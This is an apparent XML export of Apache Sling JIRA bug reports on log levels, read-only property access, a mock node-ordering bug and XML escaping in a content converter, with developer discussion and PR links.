                            <comment id="17803173" author="tmueller" created="Thu, 4 Jan 2024 13:48:36 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; Yes, this is what is implemented &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/blob/master/src/main/java/org/apache/sling/resourceresolver/impl/mapping/MapEntries.java#L1345&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/blob/master/src/main/java/org/apache/sling/resourceresolver/impl/mapping/MapEntries.java#L1345&lt;/a&gt; . Great!&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                                                <inwardlinks description="is blocked by">
                                        <issuelink>
            <issuekey id="13562493">SLING-12205</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                            <outwardlinks description="is a clone of">
                                        <issuelink>
            <issuekey id="13481473">SLING-11581</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13586127">SLING-12384</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13562340">SLING-12204</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13564017">SLING-12225</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            1 year, 41 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1gfq8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11797] Log Jobs Added with No Assigned Topology Capability at Info</title>
                <link>https://issues.apache.org/jira/browse/SLING-11797</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When creating a job where the topology does not provide a capability for the topic, the JobManagerImpl logs the following message at the DEBUG level:&lt;/p&gt;


&lt;blockquote&gt;&lt;p&gt;Persisting job {} into queue {}&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&#160;&lt;br/&gt;
This makes it challenging to identify/diagnose issues with jobs not being assigned as: * It requires enabling debug logging on the JobManagerImpl which can be quite verbose, especially under load&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;Since most production instances do not run with DEBUG, these situations will not be available in logs&lt;/li&gt;
	&lt;li&gt;The log message does not indicate that this job will not be immediately assigned to be processed&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Instead, the JobManagerImpl should log a message at least at INFO level which indicates that the Job being persisted does not have an assigned target.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13527458">SLING-11797</key>
            <summary>Log Jobs Added with No Assigned Topology Capability at Info</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Tue, 7 Mar 2023 13:25:24 +0000</created>
                <updated>Mon, 3 Apr 2023 12:33:00 +0000</updated>
                            <resolved>Fri, 17 Mar 2023 17:10:41 +0000</resolved>
                                    <version>Event 4.3.6</version>
                                    <fixVersion>Event 4.3.8</fixVersion>
                                    <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="6600">1h 50m</timespent>
                                <comments>
                            <comment id="17697505" author="cziegeler" created="Tue, 7 Mar 2023 15:54:10 +0000"  >&lt;p&gt;I&apos;m not against changing the log level, but keep in mind that this can be misleading. I wouldn&apos;t use the log for monitoring, but rather look for unassigned jobs through the API&lt;/p&gt;</comment>
                            <comment id="17699241" author="dklco" created="Sat, 11 Mar 2023 17:07:10 +0000"  >&lt;p&gt;Acknowledged. The intent isn&apos;t to use this for log monitoring, but to aid in debugging issues in a running environment. Starting a job without an execution target available isn&apos;t&#160;&lt;em&gt;necessarily&lt;/em&gt; a problem but it&apos;s an event you may want to be aware happened in a running environment, thus INFO seems more appropriate than DEBUG.&lt;/p&gt;</comment>
                            <comment id="17699270" author="dklco" created="Sat, 11 Mar 2023 19:59:56 +0000"  >&lt;p&gt;PR opened: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-event/pull/25&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-event/pull/25&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 32 weeks, 4 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1gei8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11794] ResourceCollection Cannot Get Properties with Read-Only User</title>
                <link>https://issues.apache.org/jira/browse/SLING-11794</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The ResourceCollection has a method &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcecollection/blob/dfcfd3ca53a7ffec1146a09e850893beea15716e/src/main/java/org/apache/sling/resource/collection/ResourceCollection.java#L72&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;getProperties&lt;/a&gt;, which returns a &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-api/blob/24c26e15c534e323a57eb2386befa96a323840a1/src/main/java/org/apache/sling/api/resource/ModifiableValueMap.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ModifiableValueMap&lt;/a&gt;, when adapting a &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/0ce0fb850b3a71d800bc6d9c1e3a869fc5748cb1/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrNodeResource.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;JcrNodeResource&lt;/a&gt; to a ModifiableValueMap, the JcrNodeResource &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/0ce0fb850b3a71d800bc6d9c1e3a869fc5748cb1/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrNodeResource.java#L137&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;checks to see if the session has write permissions&lt;/a&gt;. and returns null if not.&lt;/p&gt;

&lt;p&gt;Therefore effectively, if you only have read permissions for the Resource referenced by the Resource collection you cannot get the properties of a ResourceCollection.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13526735">SLING-11794</key>
            <summary>ResourceCollection Cannot Get Properties with Read-Only User</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Wed, 1 Mar 2023 19:07:38 +0000</created>
                <updated>Tue, 14 Mar 2023 18:40:09 +0000</updated>
                            <resolved>Tue, 7 Mar 2023 13:03:31 +0000</resolved>
                                    <version>Resource Collections 1.0.0</version>
                                    <fixVersion>Resource Collections 1.0.4</fixVersion>
                                    <component>Extensions</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="5400">1.5h</timespent>
                                <comments>
                            <comment id="17697421" author="dklco" created="Tue, 7 Mar 2023 13:03:31 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcecollection/pull/3&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcecollection/pull/3&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 33 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1ga20:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11789] MockNode#orderBefore incorrectly removes commonly prefixed child nodes</title>
                <link>https://issues.apache.org/jira/browse/SLING-11789</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The MockNode#orderBefore implementation is using a simple &quot;startsWith&quot; check on path strings to find the items to move.&#160; This will match too many items if the sibling nodes have names with a common prefix.&lt;/p&gt;

&lt;p&gt;For example, for the following scenario child10 should be ordered before child100, but what actually happens is both child10 and child100 get removed from the parent.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Node foo = &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.session.getRootNode().addNode(&lt;span class=&quot;code-quote&quot;&gt;&quot;foo&quot;&lt;/span&gt;);
foo.addNode(&lt;span class=&quot;code-quote&quot;&gt;&quot;child100&quot;&lt;/span&gt;);
foo.addNode(&lt;span class=&quot;code-quote&quot;&gt;&quot;child10&quot;&lt;/span&gt;);
foo.addNode(&lt;span class=&quot;code-quote&quot;&gt;&quot;child1&quot;&lt;/span&gt;);
foo.orderBefore(&lt;span class=&quot;code-quote&quot;&gt;&quot;child10&quot;&lt;/span&gt;, &lt;span class=&quot;code-quote&quot;&gt;&quot;child100&quot;&lt;/span&gt;);&#160;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Expected:&lt;/p&gt;

&lt;p&gt;The &quot;find all items matching the source&quot; logic in MockSession#orderBefore should be changed to match paths that equal the source path exactly or starts with the source path with a trailing slash.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13526183">SLING-11789</key>
            <summary>MockNode#orderBefore incorrectly removes commonly prefixed child nodes</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sat, 25 Feb 2023 23:38:28 +0000</created>
                <updated>Mon, 6 Mar 2023 18:09:57 +0000</updated>
                            <resolved>Wed, 1 Mar 2023 18:28:39 +0000</resolved>
                                                    <fixVersion>Testing JCR Mock 1.6.4</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                <comments>
                            <comment id="17693553" author="enorman" created="Sun, 26 Feb 2023 00:02:26 +0000"  >&lt;p&gt;PR #12 contains the changes for review and feedback&lt;/p&gt;</comment>
                            <comment id="17695251" author="enorman" created="Wed, 1 Mar 2023 18:28:39 +0000"  >&lt;p&gt;Merged PR at: &#160;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-jcr-mock/commit/4506578c5c562a6045981c76e4df571e1430cfd6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;4506578&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17697079" author="enorman" created="Mon, 6 Mar 2023 18:09:57 +0000"  >&lt;p&gt;Closing with the 1.6.4 release&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 33 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1g6o0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11785] cpconverter: Sling-Initial-Content String values are not properly escaped in DocView XML</title>
                <link>https://issues.apache.org/jira/browse/SLING-11785</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;it seems the cpconverter is not properly escaping string values read from Sling-Initial-Content JSON files and then converting to DocView XML.&lt;/p&gt;

&lt;p&gt;in this sample project:&lt;br/&gt;
&lt;a href=&quot;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/tree/feature/archetype-40-DRND-202-escaping&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/tree/feature/archetype-40-DRND-202-escaping&lt;/a&gt;&lt;br/&gt;
i&apos;ve introduces in &lt;a href=&quot;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/commit/866fab64b6280c213e93dbbe5c9791f1a9877f5b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;this commit&lt;/a&gt; a JSON file in Sling-Initial-Content containing two strings with regexp containing &quot;\&quot;. those strings are transferred 1:1 to the DocView XML in the content package, which is wrong. the &quot;\&quot; has to be escaped to be re-read properly via JCR API.&lt;/p&gt;

&lt;p&gt;it seems the escaping rules applied by &lt;tt&gt;org.apache.jackrabbit.vault.util.DocViewProperty#format&lt;/tt&gt; are missing.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13526043">SLING-11785</key>
            <summary>cpconverter: Sling-Initial-Content String values are not properly escaped in DocView XML</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Fri, 24 Feb 2023 09:54:34 +0000</created>
                <updated>Mon, 8 May 2023 15:54:57 +0000</updated>
                            <resolved>Thu, 2 Mar 2023 10:27:13 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.3.0</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.3.2</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17693112" author="sseifert@pro-vision.de" created="Fri, 24 Feb 2023 10:09:39 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; in my pov the code in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/blob/f01d77a60949595f9d266fcc06a72e243078902d/src/main/java/org/apache/sling/feature/cpconverter/handlers/slinginitialcontent/xmlbuffer/XMLNode.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/blob/f01d77a60949595f9d266fcc06a72e243078902d/src/main/java/org/apache/sling/feature/cpconverter/handlers/slinginitialcontent/xmlbuffer/XMLNode.java&lt;/a&gt; has be refactored to use the jackrabbit vault API to encode the values, instead of doing it manually (incomplete) with string operations.&lt;/p&gt;

&lt;p&gt;WDYT?&lt;/p&gt;</comment>
                            <comment id="17693118" author="reschke" created="Fri, 24 Feb 2023 10:25:04 +0000"  >&lt;p&gt;FWIW, I don&apos;t see no escaping there at all. Would need to read some more code to understand who&apos;s responsible for what...&lt;/p&gt;</comment>
                            <comment id="17693121" author="kwin" created="Fri, 24 Feb 2023 10:30:13 +0000"  >&lt;p&gt;I agree this should be removed and instead &lt;a href=&quot;https://github.com/apache/jackrabbit-filevault/blob/master/vault-core/src/main/java/org/apache/jackrabbit/vault/util/DocViewNode2.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/jackrabbit-filevault/blob/master/vault-core/src/main/java/org/apache/jackrabbit/vault/util/DocViewNode2.java&lt;/a&gt; should be used. But I think this is already tracked in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11421&quot; title=&quot;Use DocView serialisation classes from FileVault&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11421&quot;&gt;&lt;del&gt;SLING-11421&lt;/del&gt;&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17693123" author="sseifert@pro-vision.de" created="Fri, 24 Feb 2023 10:33:47 +0000"  >&lt;p&gt;yes, completing &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11421&quot; title=&quot;Use DocView serialisation classes from FileVault&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11421&quot;&gt;&lt;del&gt;SLING-11421&lt;/del&gt;&lt;/a&gt; would be good. the ancient staxutils are also part of the trouble in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11616&quot; title=&quot;Fix Sling-Initial-Content Handling on Windows, Fix Unit Tests on Windows&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11616&quot;&gt;&lt;del&gt;SLING-11616&lt;/del&gt;&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17693535" author="kwin" created="Sat, 25 Feb 2023 21:33:09 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; Can you check if &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/161&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/161&lt;/a&gt; fixes the issue?&lt;/p&gt;</comment>
                            <comment id="17693967" author="sseifert@pro-vision.de" created="Mon, 27 Feb 2023 11:14:24 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; thanks! - but does not work for me yet.&lt;/p&gt;

